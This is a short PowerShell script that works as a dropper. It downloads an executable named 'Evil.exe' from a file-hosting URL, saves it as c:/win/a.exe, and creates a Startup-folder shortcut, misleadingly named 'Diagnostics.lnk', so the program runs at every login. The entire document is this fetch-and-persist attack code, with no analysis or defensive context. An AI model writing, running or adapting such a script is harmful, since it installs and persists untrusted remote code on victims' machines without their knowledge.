
$objShell = New-Object -com "Wscript.Shell"

cd /
mkdir win
Invoke-WebRequest -Uri https://cdn-127.anonfiles.com/P7r1x3hcyc/ca30bb2b-1652812024/Evil.exe -OutFile c:/win/a.exe

$objShortcut = $objShell.CreateShortcut("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Diagnostics.lnk")
$objShortcut.TargetPath = "c:/win/a.exe"
$objShortcut.Save()
